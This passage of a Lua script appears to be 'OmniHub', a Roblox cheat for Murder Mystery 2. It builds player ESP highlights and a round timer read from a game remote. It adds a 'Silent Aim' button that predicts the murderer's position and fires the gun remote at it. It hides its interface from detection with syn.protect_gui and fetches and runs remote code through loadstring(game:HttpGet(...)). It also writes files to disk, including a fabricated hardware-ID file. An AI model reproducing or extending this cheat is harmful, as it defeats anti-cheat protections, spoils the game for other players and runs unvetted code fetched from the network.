       Highlights.GunDrop.Adornee = GunDrop
   elseif Highlights.GunDrop then
       Highlights.GunDrop:Destroy()
       Highlights.GunDrop = nil
   end
end

-- FIX: Enhanced player joining/leaving handlers
local PlayerAddedConnection = nil
local PlayerRemovingConnection = nil

local function SetupPlayerConnections()
    -- Clear previous connections
    if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
    if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
    
    -- Setup new connections
    PlayerAddedConnection = Players.PlayerAdded:Connect(function(player)
        -- Force update highlights on player join
        task.delay(1, function()
            if not player or not player.Parent then return end
            if player.Character then
                UpdateESP()
            end
            
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end)
    end)
    
    PlayerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
        RemoveOutline(player)
    end)
    
    -- Setup character connections for existing players
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            player.CharacterAdded:Connect(function()
                task.delay(0.5, UpdateESP) -- Update after character loads
            end)
        end
    end
end

-- FIX: ESP Toggle function with proper state management
local function ToggleESP(state)
    ESP.Enabled = state
    
    -- Update all existing highlights
    for player, highlight in pairs(Highlights) do
        highlight.Enabled = state
    end
    
    -- Force immediate update
    if state then
        UpdateESP()
    end
end




-- Round Timer Module
local TimerDisplay = {
   Enabled = true,
   RefreshRate = 0.1, -- Timer update frequency
   TimerConnection = nil,
   TimerUI = nil
}

-- Cache services
local timerRemote = game:GetService("ReplicatedStorage").Remotes.Extras.GetTimer
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

-- Create UI elements for round timer
function TimerDisplay:Create()
   if self.TimerUI then return end
   
   -- Create container frame
   local timerFrame = Instance.new("ScreenGui")
   timerFrame.Name = "RoundTimerDisplay"
   timerFrame.ResetOnSpawn = false
   timerFrame.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
   
   -- Protect GUI from detection (if exploit supports it)
   if syn and syn.protect_gui then
       syn.protect_gui(timerFrame)
       timerFrame.Parent = game:GetService("CoreGui")
   else
       timerFrame.Parent = game:GetService("CoreGui")
   end
   
   -- Create timer container
   local container = Instance.new("Frame")
   container.Name = "TimerContainer"
   container.Size = UDim2.new(0, 150, 0, 40)
   container.Position = UDim2.new(0.5, -75, 0, 10) -- Top center
   container.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
   container.BackgroundTransparency = 0.2
   container.BorderSizePixel = 0
   container.Parent = timerFrame
   
   -- Add rounded corners
   local cornerRadius = Instance.new("UICorner")
   cornerRadius.CornerRadius = UDim.new(0, 6)
   cornerRadius.Parent = container
   
   -- Add drop shadow
   local shadow = Instance.new("ImageLabel")
   shadow.Name = "Shadow"
   shadow.AnchorPoint = Vector2.new(0.5, 0.5)
   shadow.BackgroundTransparency = 1
   shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
   shadow.Size = UDim2.new(1, 10, 1, 10)
   shadow.ZIndex = -1
   shadow.Image = "rbxassetid://5554236805"
   shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
   shadow.ImageTransparency = 0.4
   shadow.ScaleType = Enum.ScaleType.Slice
   shadow.SliceCenter = Rect.new(23, 23, 277, 277)
   shadow.Parent = container
   
   -- Create title label
   local titleLabel = Instance.new("TextLabel")
   titleLabel.Name = "TitleLabel"
   titleLabel.Size = UDim2.new(1, 0, 0, 18)
   titleLabel.BackgroundTransparency = 1
   titleLabel.Text = "ROUND TIME"
   titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
   titleLabel.TextSize = 12
   titleLabel.Font = Enum.Font.GothamBold
   titleLabel.Parent = container
   
   -- Create timer text
   local timerText = Instance.new("TextLabel")
   timerText.Name = "TimerText"
   timerText.Size = UDim2.new(1, 0, 0, 22)
   timerText.Position = UDim2.new(0, 0, 0, 18)
   timerText.BackgroundTransparency = 1
   timerText.Text = "--:--"
   timerText.TextColor3 = Color3.fromRGB(255, 255, 255)
   timerText.TextSize = 18
   timerText.Font = Enum.Font.GothamSemibold
   timerText.Parent = container
   
   -- Store reference
   self.TimerUI = {
       ScreenGui = timerFrame,
       Container = container,
       TimerLabel = timerText
   }
   
   return self.TimerUI
end

-- Format time from seconds to MM:SS
local function FormatTime(seconds)
   if not seconds or type(seconds) ~= "number" then return "--:--" end
   
   seconds = math.max(0, math.floor(seconds))
   local minutes = math.floor(seconds / 60)
   seconds = seconds % 60
   
   return string.format("%02d:%02d", minutes, seconds)
end

-- Update timer display
function TimerDisplay:Update()
   if not self.TimerUI or not self.Enabled then return end
   
   -- Get current round time from remote
   local success, timeLeft = pcall(function()
       return timerRemote:InvokeServer()
   end)
   
   if success and timeLeft then
       -- Format and display time
       self.TimerUI.TimerLabel.Text = FormatTime(timeLeft)
       
       -- Add warning effect when time is running out
       if timeLeft <= 10 then
           self.TimerUI.TimerLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
           
           -- Create pulsing effect for urgency
           if not self.PulsingTween then
               local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
               self.PulsingTween = TweenService:Create(
                   self.TimerUI.TimerLabel, 
                   tweenInfo, 
                   {TextSize = 22}
               )
               self.PulsingTween:Play()
           end
       else
           -- Reset to normal state
           self.TimerUI.TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
           if self.PulsingTween then
               self.PulsingTween:Cancel()
               self.PulsingTween = nil
               self.TimerUI.TimerLabel.TextSize = 18
           end
       end
   else
       -- Handle error state
       self.TimerUI.TimerLabel.Text = "--:--"
   end
end

-- Start timer updates
function TimerDisplay:Start()
   self:Create()
   
   -- Clean up existing connection
   if self.TimerConnection then
       self.TimerConnection:Disconnect()
       self.TimerConnection = nil
   end
   
   -- Create new update loop
   self.TimerConnection = RunService.Heartbeat:Connect(function()
       task.wait(self.RefreshRate)
       self:Update()
   end)
   
   -- Show UI
   if self.TimerUI then
       self.TimerUI.ScreenGui.Enabled = true
   end
end

-- Stop timer updates
function TimerDisplay:Stop()
   if self.TimerConnection then
       self.TimerConnection:Disconnect()
       self.TimerConnection = nil
   end
   
   -- Hide UI
   if self.TimerUI then
       self.TimerUI.ScreenGui.Enabled = false
   end
end

-- Toggle timer visibility
function TimerDisplay:Toggle(state)
   self.Enabled = state
   
   if state then
       self:Start()
   else
       self:Stop()
   end
end

local function GetMurderer()
 for i,v in pairs(game.Players:GetPlayers()) do
   if v.Character:FindFirstChild("Knife") or v.Backpack:FindFirstChild("Knife") then
      return v
   end
 end
end

local AimGui = Instance.new("ScreenGui")
local AimButton = Instance.new("ImageButton")

AimGui.Parent = game.CoreGui
AimButton.Parent = AimGui
AimButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
AimButton.BackgroundTransparency = 0.3
AimButton.BorderColor3 = Color3.fromRGB(255, 100, 0)
AimButton.BorderSizePixel = 2
AimButton.Position = UDim2.new(0.897, 0, 0.3)
AimButton.Size = UDim2.new(0.1, 0, 0.2)
AimButton.Image = "rbxassetid://11162755592"
AimButton.Draggable = true
AimButton.Visible = false

local UIStroke = Instance.new("UIStroke", AimButton)
UIStroke.Color = Color3.fromRGB(255, 100, 0)
UIStroke.Thickness = 2
UIStroke.Transparency = 0.5

AimButton.MouseButton1Click:Connect(function()
   local localPlayer = Players.LocalPlayer
   local gun = localPlayer.Character:FindFirstChild("Gun") or localPlayer.Backpack:FindFirstChild("Gun")
   
   if not gun then return end
   
   local murderer = GetMurderer()
   if not murderer then return end
   
   localPlayer.Character.Humanoid:EquipTool(gun)
   
   local predictedPos = getPredictedPosition(murderer)
   if predictedPos then
       gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, predictedPos, "AH2")
   end
end)

local function getPredictedPosition(murderer)
   local character = murderer.Character
   if not character then return nil end
   
   local rootPart = character:FindFirstChild("HumanoidRootPart")
   local humanoid = character:FindFirstChild("Humanoid")
   
   if not rootPart or not humanoid then return nil end
   
   -- Use ping value from prediction state when enabled
   local PingMultiplier = predictionState.pingEnabled and (predictionState.pingValue / 1000) or 0.1
   
   local SimulatedPosition = rootPart.Position
   local SimulatedVelocity = rootPart.AssemblyLinearVelocity
   local MoveDirection = humanoid.MoveDirection
   
   local Interval = PingMultiplier  -- Dynamically adjust interval based on ping
   local Gravity = 196.2
   local FrictionDeceleration = 10
   
   SimulatedPosition = SimulatedPosition + Vector3.new(
       SimulatedVelocity.X * Interval + 0.5 * FrictionDeceleration * MoveDirection.X * Interval^2,
       SimulatedVelocity.Y * Interval - 0.5 * Gravity * Interval^2,
       SimulatedVelocity.Z * Interval + 0.5 * FrictionDeceleration * MoveDirection.Z * Interval^2
   )
   
   local Axes = {"X", "Z"}
   for _, Axis in ipairs(Axes) do
       local Goal = MoveDirection[Axis] * 16.2001
       local CurrentVelocity = SimulatedVelocity[Axis]
       
       if math.abs(CurrentVelocity) > math.abs(Goal) then
           SimulatedVelocity = SimulatedVelocity - Vector3.new(
               Axis == "X" and (FrictionDeceleration * math.sign(CurrentVelocity) * Interval) or 0,
               0,
               Axis == "Z" and (FrictionDeceleration * math.sign(CurrentVelocity) * Interval) or 0
           )
       elseif math.abs(CurrentVelocity) < math.abs(Goal) then
           SimulatedVelocity = SimulatedVelocity + Vector3.new(
               Axis == "X" and (FrictionDeceleration * math.sign(Goal) * Interval) or 0,
               0,
               Axis == "Z" and (FrictionDeceleration * math.sign(Goal) * Interval) or 0
           )
       end
   end
   
   SimulatedVelocity = SimulatedVelocity + Vector3.new(0, -Gravity * Interval, 0)
   
   local RaycastParams = RaycastParams.new()
   RaycastParams.FilterType = Enum.RaycastFilterType.Blacklist
   RaycastParams.FilterDescendantsInstances = {character}
   
   local FloorCheck = workspace:Raycast(
       SimulatedPosition, 
       Vector3.new(0, -3, 0), 
       RaycastParams
   )
   
   local CeilingCheck = workspace:Raycast(
       SimulatedPosition, 
       Vector3.new(0, 3, 0), 
       RaycastParams
   )
   
   if FloorCheck then
       SimulatedPosition = Vector3.new(
           SimulatedPosition.X, 
           FloorCheck.Position.Y + 3, 
           SimulatedPosition.Z
       )
   elseif CeilingCheck then
       SimulatedPosition = Vector3.new(
           SimulatedPosition.X, 
           CeilingCheck.Position.Y - 2, 
           SimulatedPosition.Z
       )
   end
   
   if humanoid.Jump then
       SimulatedPosition = SimulatedPosition + Vector3.new(0, 5, 0)
   end
   
   return SimulatedPosition
end

-------------------------------------LOADER----------------------------------LOADER-------------------------

-- OmniHub Loader with Enhanced Water Animation and Performance Optimization
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OmniHubLoader"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Performance configuration
local MAX_PARTICLES = 30
local PARTICLES_PER_BATCH = 5
local WAVE_SPEED = 0.5

-- Main container
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 450, 0, 250)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
mainFrame.BorderSizePixel = 0
mainFrame.BackgroundTransparency = 1
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame

local dropShadow = Instance.new("ImageLabel")
dropShadow.Name = "DropShadow"
dropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
dropShadow.BackgroundTransparency = 1
dropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
dropShadow.Size = UDim2.new(1, 40, 1, 40)
dropShadow.ZIndex = 0
dropShadow.Image = "rbxassetid://6014261993"
dropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
dropShadow.ImageTransparency = 1
dropShadow.ScaleType = Enum.ScaleType.Slice
dropShadow.SliceCenter = Rect.new(49, 49, 450, 450)
dropShadow.Parent = mainFrame

-- Water effect container
local waterContainer = Instance.new("Frame")
waterContainer.Name = "WaterContainer"
waterContainer.Size = UDim2.new(1, 0, 1, 0)
waterContainer.BackgroundTransparency = 1
waterContainer.ClipsDescendants = true
waterContainer.Parent = mainFrame

-- Water level visual
local waterLevel = Instance.new("Frame")
waterLevel.Name = "WaterLevel"
waterLevel.Size = UDim2.new(1, 0, 0, 0)
waterLevel.Position = UDim2.new(0, 0, 1, 0)
waterLevel.AnchorPoint = Vector2.new(0, 1)
waterLevel.BackgroundColor3 = Color3.fromRGB(79, 149, 255)
waterLevel.BackgroundTransparency = 0.2
waterLevel.BorderSizePixel = 0
waterLevel.Parent = waterContainer

local waterGradient = Instance.new("UIGradient")
waterGradient.Rotation = 180
waterGradient.Transparency = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0),
    NumberSequenceKeypoint.new(0.7, 0.3),
    NumberSequenceKeypoint.new(1, 0.6)
})
waterGradient.Parent = waterLevel

-- Wave effect
local waterWave1 = Instance.new("ImageLabel")
waterWave1.Name = "WaterWave1"
waterWave1.Size = UDim2.new(2, 0, 0.2, 0)
waterWave1.Position = UDim2.new(0, 0, 0, 0)
waterWave1.BackgroundTransparency = 1
waterWave1.Image = "rbxassetid://6764361046"
waterWave1.ImageTransparency = 0.7
waterWave1.ImageColor3 = Color3.fromRGB(255, 255, 255)
waterWave1.Parent = waterLevel

local waterWave2 = Instance.new("ImageLabel")
waterWave2.Name = "WaterWave2"
waterWave2.Size = UDim2.new(2, 0, 0.3, 0)
waterWave2.Position = UDim2.new(-0.5, 0, 0.1, 0)
waterWave2.BackgroundTransparency = 1
waterWave2.Image = "rbxassetid://6764361046"
waterWave2.ImageTransparency = 0.8
waterWave2.ImageColor3 = Color3.fromRGB(180, 220, 255)
waterWave2.Parent = waterLevel

-- UI elements
local logo = Instance.new("ImageLabel")
logo.Name = "Logo"
logo.Size = UDim2.new(0, 100, 0, 100)
logo.Position = UDim2.new(0.5, 0, 0.3, 0)
logo.AnchorPoint = Vector2.new(0.5, 0.5)
logo.BackgroundTransparency = 1
logo.Image = "rbxassetid://122380482857500" -- Replace with actual asset ID
logo.ImageTransparency = 1
logo.Parent = mainFrame

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 50)
title.Position = UDim2.new(0, 0, 0.55, 0)
title.Font = Enum.Font.GothamBold
title.Text = "OMNIHUB"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 36
title.BackgroundTransparency = 1
title.TextTransparency = 1
title.Parent = mainFrame

local versionText = Instance.new("TextLabel")
versionText.Name = "Version"
versionText.Size = UDim2.new(1, 0, 0, 20)
versionText.Position = UDim2.new(0, 0, 0.67, 0)
versionText.Font = Enum.Font.Gotham
versionText.Text = "V1.1.5 • By Azzakirms"
versionText.TextColor3 = Color3.fromRGB(180, 180, 255)
versionText.TextSize = 14
versionText.BackgroundTransparency = 1
versionText.TextTransparency = 1
versionText.Parent = mainFrame

local statusText = Instance.new("TextLabel")
statusText.Name = "Status"
statusText.Size = UDim2.new(0.8, 0, 0, 20)
statusText.Position = UDim2.new(0.1, 0, 0.78, 0)
statusText.Font = Enum.Font.Gotham
statusText.Text = "Initializing..."
statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
statusText.TextSize = 16
statusText.BackgroundTransparency = 1
statusText.TextTransparency = 1
statusText.Parent = mainFrame

local progressContainer = Instance.new("Frame")
progressContainer.Name = "ProgressContainer"
progressContainer.Size = UDim2.new(0.8, 0, 0, 10)
progressContainer.Position = UDim2.new(0.1, 0, 0.85, 0)
progressContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
progressContainer.BorderSizePixel = 0
progressContainer.BackgroundTransparency = 1
progressContainer.Parent = mainFrame

local progressCorner = Instance.new("UICorner")
progressCorner.CornerRadius = UDim.new(0, 5)
progressCorner.Parent = progressContainer

local progressFill = Instance.new("Frame")
progressFill.Name = "ProgressFill"
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(79, 149, 255)
progressFill.BorderSizePixel = 0
progressFill.BackgroundTransparency = 1
progressFill.Parent = progressContainer

local fillCorner = Instance.new("UICorner")
fillCorner.CornerRadius = UDim.new(0, 5)
fillCorner.Parent = progressFill

local progressGlow = Instance.new("ImageLabel")
progressGlow.Name = "ProgressGlow"
progressGlow.BackgroundTransparency = 1
progressGlow.Position = UDim2.new(0, -10, 0, -10)
progressGlow.Size = UDim2.new(1, 20, 1, 20)
progressGlow.ZIndex = 0
progressGlow.Image = "rbxassetid://5028857084"
progressGlow.ImageColor3 = Color3.fromRGB(79, 149, 255)
progressGlow.ImageTransparency = 1
progressGlow.Parent = progressFill

-- Optimized particle system
local particlePool = {}
local activeParticles = {}

-- Pre-create particle objects to prevent runtime lag
local function initializeParticlePool()
    for i = 1, MAX_PARTICLES do
        local droplet = Instance.new("Frame")
        droplet.Size = UDim2.new(0, 10, 0, 10)
        droplet.BackgroundColor3 = Color3.fromRGB(79, 149, 255)
        droplet.BackgroundTransparency = 0.3
        droplet.BorderSizePixel = 0
        
        local uiCorner = Instance.new("UICorner")
        uiCorner.CornerRadius = UDim.new(1, 0)
        uiCorner.Parent = droplet
        
        local glow = Instance.new("ImageLabel")
        glow.BackgroundTransparency = 1
        glow.Position = UDim2.new(0, -5, 0, -5)
        glow.Size = UDim2.new(1, 10, 1, 10)
        glow.ZIndex = 0
        glow.Image = "rbxassetid://5028857084"
        glow.ImageColor3 = Color3.fromRGB(79, 149, 255)
        glow.ImageTransparency = 0.7
        glow.Parent = droplet
        
        table.insert(particlePool, droplet)
    end
end

-- Get particle from pool or recycle oldest active particle
local function getParticle()
    if #particlePool > 0 then
        local particle = table.remove(particlePool)
        table.insert(activeParticles, particle)
        return particle
    elseif #activeParticles > 0 then
        -- Recycle oldest particle
        local oldest = table.remove(activeParticles, 1)
        table.insert(activeParticles, oldest)
        return oldest
    end
    return nil
end

-- Return particle to pool
local function recycleParticle(particle)
    for i, p in ipairs(activeParticles) do
        if p == particle then
            table.remove(activeParticles, i)
            particle.Parent = nil
            table.insert(particlePool, particle)
            break
        end
    end
end

-- Create and animate water particles
local function createWaterParticles(count, startYRange, endYOffset, speedRange)
    local batchSize = math.min(count, PARTICLES_PER_BATCH)
    local batchCount = math.ceil(count / batchSize)
    
    -- Process particles in smaller batches to reduce frame lag
    for batch = 1, batchCount do
        local particlesInBatch = (batch < batchCount) and batchSize or (count - (batch-1) * batchSize)
        
        for i = 1, particlesInBatch do
            local particle = getParticle()
            if not particle then continue end
            
            -- Configure particle appearance
            local size = math.random(5, 15)
            local startX = math.random(0, 450)
            local startY = math.random(startYRange[1], startYRange[2])
            local endY = startY + endYOffset
            local speed = math.random(speedRange[1] * 10, speedRange[2] * 10) / 10
            
            particle.Size = UDim2.new(0, size, 0, size)
            particle.Position = UDim2.new(0, startX, 0, startY)
            particle.BackgroundTransparency = math.random(2, 5) / 10
            particle.Parent = waterContainer
            
            -- Create trajectory tween
            local tween = TweenService:Create(
                particle,
                TweenInfo.new(speed, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                {Position = UDim2.new(0, startX + math.random(-30, 30), 0, endY)}
            )
            
            tween:Play()
            
            delay(speed, function()
                recycleParticle(particle)
            end)
        end
        
        if batch < batchCount then
            wait() -- Yield between batches to distribute processing load
        end
    end
end

-- Animate water waves
local waveConnection = nil
local function startWaveAnimation()
    local wave1Offset = 0
    local wave2Offset = 0.5
    
    waveConnection = RunService.Heartbeat:Connect(function(deltaTime)
        wave1Offset = (wave1Offset + deltaTime * WAVE_SPEED) % 1
        wave2Offset = (wave2Offset + deltaTime * WAVE_SPEED * 0.7) % 1
        
        waterWave1.Position = UDim2.new(-wave1Offset, 0, 0, 0)
        waterWave2.Position = UDim2.new(-wave2Offset, 0, 0.1, 0)
    end)
end

local function stopWaveAnimation()
    if waveConnection then
        waveConnection:Disconnect()
        waveConnection = nil
    end
end

-- Animate UI element transitions
local function animateUI(isAppearing)
    local transparency = isAppearing and 0 or 1
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    
    local elements = {
        {obj = logo, prop = {ImageTransparency = transparency}},
        {obj = title, prop = {TextTransparency = transparency}, delay = 0.1},
        {obj = versionText, prop = {TextTransparency = transparency}, delay = 0.15},
        {obj = statusText, prop = {TextTransparency = transparency}, delay = 0.2},
        {obj = progressContainer, prop = {BackgroundTransparency = transparency}, delay = 0.25},
        {obj = progressFill, prop = {BackgroundTransparency = transparency}, delay = 0.25},
        {obj = progressGlow, prop = {ImageTransparency = isAppearing and 0.7 or 1}, delay = 0.25}
    }
    
    for _, item in ipairs(elements) do
        delay(item.delay or 0, function()
            TweenService:Create(item.obj, tweenInfo, item.prop):Play()
        end)
    end
end

-- Loading sequence with tweening
local function updateLoadingProgress(startProgress, endProgress, duration)
    local progressTween = TweenService:Create(
        progressFill, 
        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
        {Size = UDim2.new(endProgress, 0, 1, 0)}
    )
    
    progressTween:Play()
    return progressTween
end

-- Main loader function
local function startLoader()
    -- Initialize particle system
    initializeParticlePool()
    
    -- Start wave animation
    startWaveAnimation()
    
    -- Initial water rise animation
    local waterRiseTween = TweenService:Create(
        waterLevel,
        TweenInfo.new(2, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out),
        {Size = UDim2.new(1, 0, 1, 0)}
    )
    
    -- Start with water droplets coming from top
    createWaterParticles(MAX_PARTICLES, {-20, 0}, 300, {1, 2})
    waterRiseTween:Play()
    
    -- Fade in UI background
    delay(0.8, function()
        TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 0}):Play()
        TweenService:Create(dropShadow, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {ImageTransparency = 0.2}):Play()
        
        -- Show UI elements with staggered animation
        delay(0.3, function()
            animateUI(true)
        end)
    end)
    
    -- Define loading steps
    wait(2.5) -- Allow initial animations to complete
    
    local loadingSteps = {
        {text = "Checking Modules...", time = 1.2},
        {text = "Checking Script...", time = 1.0},
        {text = "Getting Common Information...", time = 1.5},
        {text = "Finalizing...", time = 2.3}
    }
    
    local totalTime = 0
    for _, step in ipairs(loadingSteps) do
        totalTime = totalTime + step.time
    end
    
    local elapsedTime = 0
    
    -- Process each loading step
    for i, step in ipairs(loadingSteps) do
        statusText.Text = step.text
        
        local startProgress = elapsedTime / totalTime
        elapsedTime = elapsedTime + step.time
        local endProgress = elapsedTime / totalTime
        
        -- Update progress bar
        local progressTween = updateLoadingProgress(startProgress, endProgress, step.time)
        
        -- Create ambient water particles during loading
        createWaterParticles(math.min(3, MAX_PARTICLES), {220, 240}, 30, {0.5, 0.8})
        
        wait(step.time)
    end
    
    -- Brief pause at 100%
    wait(0.5)
    
    -- Begin outro transition
    animateUI(false)
    wait(0.6)
    
    -- Water drain animation with splash effect
    createWaterParticles(MAX_PARTICLES, {50, 200}, 250, {0.8, 1.5})
    
    local drainWaterTween = TweenService:Create(
        waterLevel,
        TweenInfo.new(1.5, Enum.EasingStyle.Cubic, Enum.EasingDirection.In),
        {Size = UDim2.new(1, 0, 0, 0)}
    )
    drainWaterTween:Play()
    
    -- Fade out background as water drains
    TweenService:Create(mainFrame, TweenInfo.new(1.2, Enum.EasingStyle.Sine), {BackgroundTransparency = 1}):Play()
    TweenService:Create(dropShadow, TweenInfo.new(1.2, Enum.EasingStyle.Sine), {ImageTransparency = 1}):Play()
    
    -- Wait for animations to complete
    wait(1.8)
    
    -- Stop animations and cleanup
    stopWaveAnimation()
    
    -- Clear particles
    for _, particle in ipairs(activeParticles) do
        particle:Destroy()
    end
    for _, particle in ipairs(particlePool) do
        particle:Destroy()
    end
    
    screenGui:Destroy()
    
    -- Here you would load your main hub
    -- loadMainHub()
end

-- Start the loader
startLoader()

-- Fluent UI Integration (preserved from original code)
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
  Title = "OmniHub Script By Azzakirms",
  SubTitle = "V1.1.5",
  TabWidth = 100,
  Size = UDim2.fromOffset(380, 300),
  Acrylic = true,
  Theme = "Dark",
  MinimizeKey = Enum.KeyCode.LeftControl
})

-- Create tabs
local Tabs = {
   Main = Window:AddTab({ Title = "Main", Icon = "eye" }),
   Visuals = Window:AddTab({ Title = "Visuals", Icon = "camera" }),
   Combat = Window:AddTab({ Title = "Combat", Icon = "crosshair" }),
   Farming = Window:AddTab({ Title = "Farming", Icon = "dollar-sign" }),
   Premium = Window:AddTab({ Title = "Premium", Icon = "star" }),
   Discord = Window:AddTab({ Title = "Join Discord", Icon = "message-square" }),
   Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

Tabs.Main:AddParagraph({
    Title = "Development Notice",
    Content = "OmniHub is still in early development. You may experience bugs during usage. If you have suggestions for improving our MM2 script, please join our Discord server Thank you ."
})

local MainSection = Tabs.Main:AddSection("User Information")

-- User Information Display
local UserInfo = Tabs.Main:AddParagraph({
    Title = "User Details",
    Content = string.format(
        "Username: %s\nUser ID: %s\nServer ID: %s",
        game.Players.LocalPlayer.Name,
        game.Players.LocalPlayer.UserId,
        game.JobId
    )
})



-- Add ESP toggle to Visuals tab
Tabs.Visuals:AddSection("Character ESP")

-- FIX: Properly implement toggle callback
Tabs.Visuals:AddToggle("ESPToggle", {
   Title = "Esp Players",
   Default = ESP.Enabled,
   Callback = function(Value)
       ToggleESP(Value)
   end
})

-- Add timer toggle to UI
Tabs.Visuals:AddToggle("TimerToggle", {
   Title = "Show Round Timer",
   Default = TimerDisplay.Enabled,
   Callback = function(Value)
       TimerDisplay:Toggle(Value)
   end
})

-- Initialize timer on script load
TimerDisplay:Start()

local SilentAimToggle = Tabs.Combat:AddToggle("SilentAimToggle", {
   Title = "Silent Aim",
   Default = false,
   Callback = function(toggle)
       AimButton.Visible = toggle
   end
})

-- Initialize SaveManager
SaveManager:SetLibrary(Fluent)
SaveManager:SetFolder("OmniHub/MM2")
SaveManager:BuildConfigSection(Tabs.Settings)

-- Configure the InterfaceManager with Fluent
InterfaceManager:SetLibrary(Fluent)
InterfaceManager:SetFolder("OmniHub")
InterfaceManager:BuildInterfaceSection(Tabs.Settings)

-- Create directory structure and files
pcall(function()
   -- Create main directories
   if not isfolder("OmniHub") then makefolder("OmniHub") end
   if not isfolder("OmniHub/MM2") then makefolder("OmniHub/MM2") end
   if not isfolder("OmniHub/language") then makefolder("OmniHub/language") end
   
   -- Create language file with specified content
   writefile("OmniHub/language/en-us.txt", "en-us")
   
   -- Create important.txt with specified message
   writefile("OmniHub/important.txt", "i created this Script By My Own Be Happy All the time")
   
   -- Create logs.txt with specified content
   writefile("OmniHub/logs.txt", "if you do anything malicious it goes here.")
   
   -- Create Discord.lua with invite link
   writefile("OmniHub/Discord.lua", "join https://discord.com/invite/3DR8b2pA2z LoL")
   
   -- HWID file with realistic format
   writefile("OmniHub/hwid.dat", string.format("%x%x%x-%x%x-%x%x-%x", 
       math.random(0x1000, 0xffff), 
       math.random(0x1000, 0xffff),
       math.random(0x1000, 0xffff),
       math.random(0x1000, 0xffff),
       math.random(0x1000, 0xffff),
       math.random(0x1000, 0xffff),
       math.random(0x1000, 0xffff),
       math.random(0x100, 0xfff)))
end)

-- FIX: Proper initialization sequence
local function Initialize()
    -- Setup all connections
    SetupRoleTracking()
    SetupGunTracking()
    SetupPlayerConnections()
    
    -- Start ESP update loop with proper update frequency
    local ESPUpdateConnection = RunService.RenderStepped:Connect(UpdateESP)
    
    -- FIX: Proper cleanup without using BindToClose (client-side only)
    local cleanupFunction = function()
        -- Disconnect all connections
        if RoleUpdateConnection then RoleUpdateConnection:Disconnect() end
        if PlayerAddedConnection then PlayerAddedConnection:Disconnect() end
        if PlayerRemovingConnection then PlayerRemovingConnection:Disconnect() end
        if ESPUpdateConnection then ESPUpdateConnection:Disconnect() end
        
        for _, conn in pairs(GunTrackingConnections) do
            conn:Disconnect()
        end
        
        -- Clean up all highlights
        for player, highlight in pairs(Highlights) do
            if highlight and highlight.Parent then
                highlight:Destroy()
            end
        end
        
        -- Remove the highlight folder
        if HighlightFolder and HighlightFolder.Parent then
            HighlightFolder:Destroy()
        end
    end
    
    -- Register cleanup function for script termination
    if getgenv then
        getgenv().ESPCleanupFunction = cleanupFunction
    end
    
    -- Success notification
    Fluent:Notify({
       Title = "Enhanced ESP Loaded",
       Content = "Improved character outlines are now active",
       Duration = 3
    })
    
    -- Load saved configuration
    SaveManager:LoadAutoloadConfig()
end

-- Start the initialization process
Initialize()